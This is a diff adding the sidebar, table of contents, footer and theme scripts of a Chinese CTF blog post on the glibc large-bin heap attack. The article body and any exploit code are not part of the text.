+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            DIR-815
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://s2.loli.net/2024/12/02/u9D7JI4F1TZHOqB.jpg" data-sizes="auto" alt="LitCTF2024 Pwn方向wp" class="lazyload">
+        
+      
+      <a href="/2024/06/07/LitCTF_wp/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          LitCTF2024 Pwn方向wp
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 导言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#large_bin"><span class="toc-number">2.</span> <span class="toc-text"> large_bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-number">2.2.</span> <span class="toc-text"> 结构</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-223%E7%89%88%E6%9C%AC%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text"> glibc-2.23版本的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text"> 适用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#how2heap%E6%BA%90%E7%A0%81%E5%8F%8A%E5%8A%A8%E8%B0%83"><span class="toc-number">3.2.</span> <span class="toc-text"> how2heap源码及动调</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E4%B8%89%E4%B8%AA%E5%A0%86"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 申请三个堆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%90%E6%AD%A5%E9%87%8A%E6%94%BE%E4%B8%89%E4%B8%AA%E5%A0%86"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 逐步释放三个堆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9p2%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 修改p2的结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9stack_var%E5%80%BC"><span class="toc-number">3.2.4.</span> <span class="toc-text"> 修改stack_var值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-231%E7%89%88%E6%9C%AC%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text"> glibc-2.31版本的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E5%A2%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text"> 新增检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%BA%90%E7%A0%81%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text"> 新源码利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#how2heap%E6%96%B0%E6%BA%90%E7%A0%81%E5%8F%8A%E5%8A%A8%E8%B0%83"><span class="toc-number">4.3.</span> <span class="toc-text"> how2heap新源码及动调</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#freep2%E5%8F%8A%E5%85%B6%E5%90%8E%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">4.3.1.</span> <span class="toc-text"> free(p2)及其后的变化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">4.4.</span> <span class="toc-text"> 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-litctf2024-heap239"><span class="toc-number">4.5.</span> <span class="toc-text"> 例题 LitCTF2024 Heap2.39</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%88%86%E6%9E%90"><span class="toc-number">4.5.1.</span> <span class="toc-text"> 源代码及分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83%E8%BF%87%E7%A8%8B"><span class="toc-number">4.5.2.</span> <span class="toc-text"> 动调过程</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        38.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:45
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 导言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#large_bin"><span class="toc-number">2.</span> <span class="toc-text"> large_bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-number">2.2.</span> <span class="toc-text"> 结构</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-223%E7%89%88%E6%9C%AC%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text"> glibc-2.23版本的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text"> 适用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#how2heap%E6%BA%90%E7%A0%81%E5%8F%8A%E5%8A%A8%E8%B0%83"><span class="toc-number">3.2.</span> <span class="toc-text"> how2heap源码及动调</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E4%B8%89%E4%B8%AA%E5%A0%86"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 申请三个堆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%90%E6%AD%A5%E9%87%8A%E6%94%BE%E4%B8%89%E4%B8%AA%E5%A0%86"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 逐步释放三个堆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9p2%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 修改p2的结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9stack_var%E5%80%BC"><span class="toc-number">3.2.4.</span> <span class="toc-text"> 修改stack_var值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-231%E7%89%88%E6%9C%AC%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text"> glibc-2.31版本的攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E5%A2%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text"> 新增检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%BA%90%E7%A0%81%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text"> 新源码利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#how2heap%E6%96%B0%E6%BA%90%E7%A0%81%E5%8F%8A%E5%8A%A8%E8%B0%83"><span class="toc-number">4.3.</span> <span class="toc-text"> how2heap新源码及动调</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#freep2%E5%8F%8A%E5%85%B6%E5%90%8E%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">4.3.1.</span> <span class="toc-text"> free(p2)及其后的变化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">4.4.</span> <span class="toc-text"> 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-litctf2024-heap239"><span class="toc-number">4.5.</span> <span class="toc-text"> 例题 LitCTF2024 Heap2.39</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%88%86%E6%9E%90"><span class="toc-number">4.5.1.</span> <span class="toc-text"> 源代码及分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83%E8%BF%87%E7%A8%8B"><span class="toc-number">4.5.2.</span> <span class="toc-text"> 动调过程</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.0.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
+
